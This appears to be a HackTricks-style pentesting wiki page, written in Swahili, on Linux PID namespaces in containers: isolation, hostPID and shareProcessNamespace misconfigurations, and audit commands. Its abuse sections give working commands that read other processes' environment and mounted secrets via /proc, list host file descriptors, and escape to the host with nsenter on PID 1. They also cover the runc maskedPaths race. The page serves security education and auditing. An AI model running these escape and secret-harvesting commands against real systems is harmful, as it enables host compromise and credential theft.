# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Muhtasari

PID namespace hudhibiti jinsi processes zinavyopangiwa namba na ni processes zipi zinazoonekana. Hii ndiyo sababu container inaweza kuwa na PID 1 yake yenyewe ingawa si mashine halisi. Ndani ya namespace, workload huona kinachoonekana kuwa process tree ya ndani. Nje ya namespace, host bado huona PIDs halisi za host na mazingira kamili ya processes.<sup>[[3]](#references)</sup>

Kwa mtazamo wa usalama, PID namespace ni muhimu kwa sababu uwezo wa kuona processes una thamani. Workload inapoweza kuona processes za host, inaweza kuwa na uwezo wa kuchunguza majina ya services, command-line arguments, secrets zilizopitishwa kwenye process arguments, hali inayotokana na environment kupitia `/proc`, na targets zinazowezekana za kuingia kwenye namespaces. Ikiweza kufanya zaidi ya kuona processes hizo pekee, kwa mfano kutuma signals au kutumia ptrace chini ya masharti yanayofaa, tatizo huwa kubwa zaidi.

## Uendeshaji

PID namespace mpya huanza ikiwa na mfumo wake wa ndani wa kupanga namba za processes. Process ya kwanza inayoundwa ndani yake huwa PID 1 kwa mtazamo wa namespace hiyo, jambo ambalo pia humaanisha kwamba hupata semantics maalum zinazofanana na init kwa children waliokuwa yatima na tabia ya signals. Hii inaeleza mambo mengi yasiyo ya kawaida ya containers kuhusu init processes, ukusanyaji wa zombie processes, na kwa nini wrappers ndogo za init hutumiwa wakati mwingine kwenye containers.<sup>[[3]](#references)</sup>

PID namespaces huunda hierarchy. Process katika ancestor namespace inaweza kushughulikia descendants kwa kutumia PID iliyopewa katika ancestor hiyo, lakini descendant haiwezi kushughulikia tasks zilizo kwenye ancestor pekee kupitia syscalls za kawaida zinazotegemea PID au `setns()` kwenda juu kwenye ancestor PID namespace. procfs inayomilikiwa na ancestor na kufichuliwa kwa descendant bado inaweza ku-leak mtazamo wa processes wa ancestor. Pia, kujiunga na PID namespace kwa `setns()` hubadilisha namespace kwa **children wa baadaye**, si caller yenyewe; kwa hiyo tools hufanya fork baada ya kujiunga. Mount ya procfs huhifadhi mtazamo wa PID wa process iliyoifanya mount, ndiyo sababu kuunda procfs mpya baada ya `unshare(CLONE_NEWPID)` ni muhimu kwa usalama na si suala la mwonekano pekee.<sup>[[3]](#references)</sup>

Somo muhimu la usalama ni kwamba process inaweza kuonekana kuwa imetengwa kwa sababu huona PID tree yake pekee, lakini utengaji huo unaweza kuondolewa kwa makusudi. Docker hufichua hili kupitia `--pid=host`, huku Kubernetes ikifanya hivyo kupitia `hostPID: true`. Container inapojiunga na host PID namespace, workload huona processes za host moja kwa moja, na attack paths nyingi zinazofuata huwa halisi zaidi.

## Maabara

Kuunda PID namespace manually:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Shell sasa inaona mwonekano wa faragha wa processes. Flag ya `--mount-proc` ni muhimu kwa sababu ina-mount instance ya procfs inayolingana na PID namespace mpya, hivyo orodha ya processes huwa thabiti inapokuwa ndani.<sup>[[3]](#references)</sup>

Kwa kulinganisha tabia ya container:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Tofauti hiyo inaonekana mara moja na ni rahisi kuelewa, ndiyo maana hii ni labu nzuri ya kwanza kwa wasomaji.

## Matumizi ya Runtime

Containers za kawaida katika Docker, Podman, containerd, na CRI-O hupata PID namespace yao wenyewe. Containers za Kubernetes kwa kawaida huwa na mionekano tofauti ya PID; `shareProcessNamespace: true` huunda kwa makusudi mwonekano mmoja wa Pod nzima.<sup>[[4]](#references)</sup> Kinyume chake, `hostPID: true` huchagua PID namespace ya node. Mazingira ya LXC/Incus hutegemea kernel primitive hiyo hiyo, ingawa matumizi ya system-container yanaweza kuonyesha process trees zilizo changamano zaidi na kuhimiza debugging shortcuts zaidi.

Kanuni hiyo hiyo inatumika kila mahali: ikiwa runtime ilichagua kutotenga PID namespace, huo ni upunguzaji wa makusudi wa mpaka wa container.

## Misconfigurations

Misconfiguration ya kawaida ni kushiriki host PID. Timu mara nyingi huhalalisha hili kwa debugging, monitoring, au urahisi wa service-management, lakini linapaswa kila wakati kuchukuliwa kama security exception yenye maana. Hata kama container haina write primitive ya moja kwa moja juu ya host processes, mwonekano pekee unaweza kufichua mengi kuhusu mfumo. Mara tu capabilities kama `CAP_SYS_PTRACE` au procfs access yenye manufaa zinapoongezwa, hatari huongezeka kwa kiasi kikubwa.

Kosa jingine ni kudhani kwamba kwa sababu workload haiwezi kwa default kuua au kufanya ptrace kwenye host processes, basi kushiriki host PID hakuna madhara. Hitimisho hilo linapuuza thamani ya enumeration, upatikanaji wa namespace-entry targets, na jinsi PID visibility inavyoungana na controls nyingine zilizodhoofishwa.

### Kubernetes Pod-wide process sharing

`shareProcessNamespace: true` ni tofauti na `hostPID`: hufichua processes za **containers nyingine zilizo katika Pod hiyo hiyo**, si node processes. Sidecar au debug container iliyo-compromise inaweza kisha ku-enumerate sibling command lines na environment data kulingana na procfs access checks, kutuma signals pale credentials zinaporuhusu, na kupitia filesystem ya sibling kupitia `/proc/<pid>/root`. Kubernetes inaonya wazi kwamba command-line/environment secrets na container filesystems hulindwa tu na Unix permissions zinazotumika.<sup>[[4]](#references)</sup>

Ukaguzi muhimu upande wa cluster:
```bash
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
[.metadata.namespace,.metadata.name,
(.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```
Kutoka kwenye container iliyoathiriwa katika Pod-wide PID namespace, kwanza jaribu ufikiaji halisi badala ya kudhani kwamba visibility ni sawa na readability:<sup>[[4]](#references)</sup>
```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```
## Matumizi Mabaya

Ikiwa host PID namespace imeshirikiwa, attacker anaweza kukagua process za host, kukusanya process arguments, kutambua services zinazovutia, kupata PIDs zinazoweza kutumiwa na `nsenter`, au kuchanganya mwonekano wa process na privilege inayohusiana na ptrace ili kuingilia workloads za host au workloads zilizo jirani. Katika baadhi ya hali, kuona tu process sahihi inayotumika kwa muda mrefu kunatosha kubadili mpango uliobaki wa attack.

Hatua ya kwanza ya vitendo huwa kuthibitisha kwamba process za host zinaonekana kweli:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Mara PIDs za host zinapoonekana, arguments za process na targets za namespace-entry mara nyingi huwa chanzo muhimu zaidi cha taarifa:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Ikiwa `nsenter` inapatikana na privileges za kutosha zipo, jaribu kubaini ikiwa process inayoonekana ya host inaweza kutumika kama namespace bridge:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Hata kuingia kunapozuiwa, kushiriki PID za host tayari kuna thamani kwa sababu hufichua mpangilio wa huduma, vipengele vya runtime, na michakato yenye privileges inayoweza kulengwa baadaye. Kuonekana kwa PID pekee **hakutoi** ruhusa ya kutuma signal, kufanya trace, kusoma entries nyeti za `/proc/<pid>`, au kujiunga na namespaces nyingine za target; credentials, dumpability, capabilities katika user namespace inayomiliki target namespace, sera ya Yama/LSM, na seccomp bado ni muhimu.<sup>[[3]](#references)</sup> Tazama [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace) kwa mifano ya process-injection.

Kuonekana kwa PID za host pia hufanya abuse ya file descriptor kuwa halisi zaidi. Ikiwa process yenye privileges ya host au workload jirani ina file au socket nyeti iliyofunguliwa, attacker anaweza kuweza kukagua `/proc/<pid>/fd/` na kufikia object ya msingi, kutegemea checks za ptrace-style, ownership, mount options za procfs, aina ya object, na service model ya target. Kuona symlink ya FD pekee hakumaanishi kwamba inaweza kufunguliwa, na socket haiwezi kunakiliwa kwa kufungua tu symlink yake ya `/proc/<pid>/fd/N`. Kwa primitive tofauti ya `pidfd_getfd()` na authorization checks zake, tazama [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md).<sup>[[3]](#references)</sup>
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Amri hizi ni muhimu kwa sababu zinajibu ikiwa `hidepid=1` au `hidepid=2` inapunguza mwonekano kati ya process na nyingine, na ikiwa descriptors zinazoonekana kuwa za kuvutia, kama vile secret files zilizo wazi, logs, au Unix sockets, zinaonekana kabisa.

### Mfano Kamili: host PID + `nsenter`

Kushiriki host PID huwa host escape ya moja kwa moja wakati process pia ina privilege ya kutosha ya kujiunga na host namespaces:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Ikiwa command itafaulu, container process sasa inatekelezwa katika mount, UTS, network, IPC, na PID namespaces za host. Athari yake ni kucompromise host mara moja.

Hata wakati `nsenter` yenyewe haipo, matokeo hayo hayo yanaweza kupatikana kupitia binary ya host ikiwa filesystem ya host ime-mountiwa:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Maelezo ya Hivi Karibuni ya Runtime

Baadhi ya mashambulizi yanayohusiana na PID namespace si `hostPID: true` misconfigurations za kawaida, bali ni bugs za utekelezaji wa runtime zinazohusu jinsi protections za procfs zinavyotumika wakati wa usanidi wa container.

#### Race ya `maskedPaths` kuelekea host procfs

Katika matoleo yenye udhaifu ya `runc`, attackers wanaoweza kudhibiti container image au workload ya `runc exec` wanaweza kufanya race kwenye awamu ya masking kwa kubadilisha `/dev/null` iliyo upande wa container na kuwa symlink inayoelekeza kwenye procfs path nyeti kama `/proc/sys/kernel/core_pattern`. Ikiwa race hiyo ingefaulu, masked-path bind mount inaweza kuwekwa kwenye target isiyo sahihi na kufichua procfs knobs za host-global kwa container mpya.<sup>[[1]](#references)</sup>

Amri muhimu ya review:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Hili ni muhimu kwa sababu athari ya mwisho inaweza kuwa sawa na kufichuliwa moja kwa moja kwa procfs: `core_pattern` au `sysrq-trigger` inayoweza kuandikwa, ikifuatiwa na utekelezaji wa code kwenye host au denial of service. Kurasa maalum za [masked paths](../masked-paths.md) na [sensitive host mounts](../../sensitive-host-mounts.md) zinaeleza attack surface ya jumla ya procfs bila kuirudia hapa.

#### Namespace injection na `insject`

Zana za Namespace injection kama vile `insject` zinaonyesha kuwa mwingiliano na PID-namespace hauhitaji kila mara kuingia kwanza kwenye namespace lengwa kabla ya kuunda process. Msaidizi anaweza kujiambatisha baadaye, kutumia `setns()`, na kutekeleza huku akihifadhi uwezo wa kuona PID space lengwa:<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Aina hii ya technique ni muhimu hasa kwa advanced debugging, offensive tooling, na post-exploitation workflows ambapo namespace context lazima iunganishwe baada ya runtime kuanzisha workload.

### Mifumo Husika ya Matumizi Mabaya ya FD

Mifumo miwili inafaa kutajwa wazi wakati host PIDs zinaonekana. Kwanza, privileged process inaweza kuweka sensitive file descriptor ikiwa wazi wakati wa `execve()` kwa sababu haikuwekewa `O_CLOEXEC`. Pili, services zinaweza kutuma file descriptors kupitia Unix sockets kwa kutumia `SCM_RIGHTS`. Katika hali zote mbili, kitu cha kuvutia si pathname tena, bali ni handle ambayo tayari iko wazi na ambayo lower-privilege process inaweza kurithi au kupokea.

Hili ni muhimu katika container work kwa sababu handle inaweza kuelekeza kwenye `docker.sock`, privileged log, host secret file, au object nyingine yenye thamani kubwa, hata wakati path yenyewe haipatikani moja kwa moja kutoka kwenye container filesystem.

## Ukaguzi

Madhumuni ya commands hizi ni kubaini ikiwa process ina private PID view au ikiwa tayari inaweza kuorodhesha process landscape pana zaidi.
```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```
Ni nini cha kuvutia hapa:<sup>[[3]](#references)</sup>

- Ikiwa process list ina host services zinazoonekana wazi, host PID sharing huenda tayari iko enabled.
- Kuona tree ndogo ya container-local pekee ndiyo baseline ya kawaida; kuona `systemd`, `dockerd`, au daemons zisizohusiana si kawaida.
- `NSpid` inaweza kufichua PID mapping katika nested namespaces. Thamani iliyo kushoto kabisa inahusiana na PID namespace inayohusishwa na procfs mount, ikifuatiwa na thamani za namespaces zilizowekwa ndani yake kwa mfuatano.
- `readlink /proc/self/ns/pid` peke yake haiwezi kuthibitisha `hostPID`: container iliyotengwa pia ina PID-namespace inode halali. Linganisha na process list, procfs mount, runtime configuration, na namespace inode ya upande wa host inapopatikana.
- Host PIDs zinapoonekana, hata taarifa za process zilizo read-only huwa muhimu kwa reconnaissance.

Ukigundua container inayotumia host PID sharing, usichukulie hili kama tofauti ya mwonekano tu. Ni mabadiliko makubwa katika kile workload inaweza kuona na huenda ikaathiri.



## References

- [1] [Ushauri wa usalama wa runc: container escape kupitia matumizi mabaya ya "masked path" kutokana na mount race conditions (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Kutolewa kwa Tool – insject: Linux Namespace Injector](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Kitabu cha Linux man-pages 6.19](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [Kushiriki Process Namespace kati ya Containers katika Pod](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
{{#include ../../../../../banners/hacktricks-training.md}}
